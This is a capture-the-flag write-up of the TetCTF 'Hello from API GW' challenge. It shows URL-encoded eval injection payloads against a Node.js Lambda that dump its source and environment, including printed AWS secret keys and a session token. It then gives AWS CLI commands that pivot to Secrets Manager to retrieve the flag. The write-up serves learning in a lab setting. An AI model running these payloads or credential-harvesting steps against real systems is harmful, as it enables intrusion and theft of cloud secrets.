
# Hello from API GW

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FuE2hEAC346voMt35pxKI%2Fimage.png?alt=media&token=9aa86f7e-6532-4403-bf07-8451967b417a)

Upon visiting the URL, the API Gateway rendered the text "Welcome to TetCTF!"

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FESrIfhU2j7e0vl0HxX17%2Fimage.png?alt=media&token=dd93c505-65bb-4224-8d2a-58666a7e31e6)

Based on my previous experience in solving similar CTF, I assumed that its API Gateway calling a Lambda Function, and that I need to perform RCE. I tried out different template injection via fuzzing and realize that its just a simple calculator, and `7*7` works.

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FEb2Zl0LXnXATJBzlL5HN%2Fimage.png?alt=media&token=e379524e-ccc4-46f1-8dd8-61529279699d)

The error message also suggest that it is running some form of JavaScript

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FKVzhvCJfZ69Tx6A6DcRT%2Fimage.png?alt=media&token=a6971c57-fdc4-4789-8601-c33d68a87790)

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2F7B7RS1xMjSAH8uMiESLV%2Fimage.png?alt=media&token=7b7f451f-ee3f-44af-b33c-c1cf9fdcaf00)

Using a RCE payload, I am able to leak the source code as well as the environment variable.
```
https://huk5xbypcc.execute-api.ap-southeast-2.amazonaws.com/dev/vulnerable?vulnerable=require(%27fs%27).readFileSync(%27index.js%27).toString(%27utf-8%27)
```
```js
exports.handler = async (event) => {
    try {
        if (event.queryStringParameters && event.queryStringParameters.vulnerable) {
            let result = eval(event.queryStringParameters.vulnerable);
            return {
                statusCode: 200,
                body: JSON.stringify({
                    message: "Evaluated User Input",
                    result: result
                }),
            };
        }
        return {
            statusCode: 200,
            body: JSON.stringify("Hello from Lambda")
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({
                error: error.message
            }),
        };
    }
};

​```

https://huk5xbypcc.execute-api.ap-southeast-2.amazonaws.com/dev/vulnerable?vulnerable=require('fs').readFileSync('/proc/self/environ').toString()
```
```
AWS_LAMBDA_FUNCTION_VERSION=$LATEST

AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEBQaDmFwLXNvdXRoZWFzdC0yIkcwRQIhAMeg/PJqonDc4qfq7P63y7U3Vj0KsTw1pCh9gvUecuL8AiA9Z7SSZ/BCBBM7OwAFwr/Ug53v74GEalEOfLxSVYvBQCrFAwjN//////////8BEAMaDDU0MzMwMzM5Mzg1OSIMLmNanKGb1nPmehnXKpkDNg8VuP3WKEXVnBwcjJq0JVbLT/uUxbgBnqzt2VhK56wXvbhSIB4ZX7hyykuh+mD66e0p9a2e+tIFnRWbLA9osugkHFNwLXuQXD3b1m+n4oAhjBP5gNFprxuSfmx9mhFz0xNaD4EQqjljq8rBU3XCIC4rxDdayHyDKewvwQnrtvLuYD5udZJyUa1LOiEHPJcmsUVFRJ+7R2VzkF2OkX6fYjq7Vei3YYVKGsSK+7ZsGxV0tuOjWkUfFIKEPFVzDuZj8Xqy5bGp/ccrAof6Kj6dfCmcLxi7SICxYw+LxM7qx6DmJM9Gn8VQrk4hMgoM/OfjNgSpSTwr5CWAYb4xPTLTvt2CbqLbYHrvxNTgmBc0A9K8sE3r9v5n9vIofujKCPqqsjQp5STMDN9URSdHBKNFLyinTrMaQ5WBA/THDg9v7DpyxWGgL350zocO0e30Vqm+zsWtud8Ea+Jn6BYPM+Ectrnzf9ggYlmJavov5LVTreIgl4VRf2wgO6IqPuNb6xLDWOexZr9p2DvkPLHXH1N5DQ2IOKsHRhYa2jDyqdetBjqeAXK695/A+F/+F1GfaafqTqcY1MzUHVUGL/ORACTK3E6sMMGg/5DGJaTNuWWzlnmxSd6oKuOHW9s93RXO32umruWvhaHzz0ibshuT3xzh9hp9yLyJ756aN8r628E8OjTibNSZP59O4ZsvMTjzz5TB1swijs7Mw/bxy00DGVdfWY0s9nzG8RunlIJnK8GQ96WcUU1sFv5/3dQAcf00HVGL

LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib

LAMBDA_TASK_ROOT=/var/task

AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/TetCtfStack-VulnerableLambdaAA73A104-aSkHuTfgUzPR

AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001

AWS_LAMBDA_LOG_STREAM_NAME=2024/01/28/[$LATEST]997100646f654f0d8744d1fbc6bf221b

AWS_EXECUTION_ENV=AWS_Lambda_nodejs18.x

AWS_LAMBDA_FUNCTION_NAME=TetCtfStack-VulnerableLambdaAA73A104-aSkHuTfgUzPR

AWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000

PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin

AWS_DEFAULT_REGION=ap-southeast-2

PWD=/var/task

AWS_SECRET_ACCESS_KEY=GDP3gUWtK0YCvjLu6hgfA/KWdeC2NYw40+4WjAsn

LAMBDA_RUNTIME_DIR=/var/runtime

LANG=en_US.UTF-8

AWS_LAMBDA_INITIALIZATION_TYPE=on-demand

NODE_PATH=/opt/nodejs/node18/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task

TZ=:UTC

AWS_REGION=ap-southeast-2

ENV_ACCESS_KEY=AKIAX473H4JB76WRTYPI

AWS_ACCESS_KEY_ID=ASIAX473H4JBRNS73MR6

SHLVL=0

ENV_SECRET_ACCESS_KEY=f6N48oKwKNkmS6xVJ8ZYOOj0FB/zLb/QfXCWWqyX

_AWS_XRAY_DAEMON_ADDRESS=169.254.79.129

_AWS_XRAY_DAEMON_PORT=2000

_LAMBDA_TELEMETRY_LOG_FD=3

AWS_XRAY_CONTEXT_MISSING=LOG_ERROR

_HANDLER=index.handler

AWS_LAMBDA_FUNCTION_MEMORY_SIZE=128

NODE_EXTRA_CA_CERTS=/var/runtime/ca-cert.pem
```
Now that we have the AWS Credentials, we can pivot to the cloud portion of the challenge.

First, I tried enumerating with `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`; however, it quickly proved itself to be a red herring as there are no permissions configured.

I looked at the environment variable again, and reliaze there is an extra set of key being saved in environment variable, namely `ENV_ACCESS_KEY` and `ENV_SECRET_ACCESS_KEY`.

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FDnMveOVTNolAb7jSi6dB%2Fimage.png?alt=media&token=c64e914a-2d7d-47c6-9277-1255a6235b8e)

Next, I performed manual enumeration but couldnt get any results as the user does not have much permission.

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FvxofVUIQFuAOnFQwvmuI%2Fimage.png?alt=media&token=dd4f8b59-7f5e-4595-8ec3-951ab1f29347)

I was stuck here for a while, and decided to use [`enumerate-iam`](https://github.com/andresriancho/enumerate-iam) to help perform the enumeration. (ps i also used enumerate-iam for the previous part). Immediately, some interesting permission pop out.

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FBbqzmCtnWUDtwcwouk22%2Fimage.png?alt=media&token=298e3fc1-413d-48a2-b281-cb9e251c60b1)

Hindsight is 20/20, of course the secret-user will have permission on secretsmanager 🤦‍♂️

I am then able to just retrieve the flag from the secretsmanager.
```
aws secretsmanager list-secrets --profile tet

aws secretsmanager get-secret-value --secret-id prod/TetCTF/Flag --profile tet
```
![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FbBOx1qKeqd89rRNg0iZr%2Fimage.png?alt=media&token=41bab58e-7b68-4eb9-86e0-09cf46e11239)

Flag: `TetCTF{B0unTy_$$$-50_for_B3ginNeR_2a3287f970cd8837b91f4f7472c5541a}`

Reference
https://blog.appsecco.com/nodejs-and-a-simple-rce-exploit-d79001837cc6
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/Not_defined
https://swisskyrepo.github.io/InternalAllTheThings/cloud/aws/AWS%20Pentest/#checking-all-managed-policies-attached-to-the-user
https://github.com/andresriancho/enumerate-iam
https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/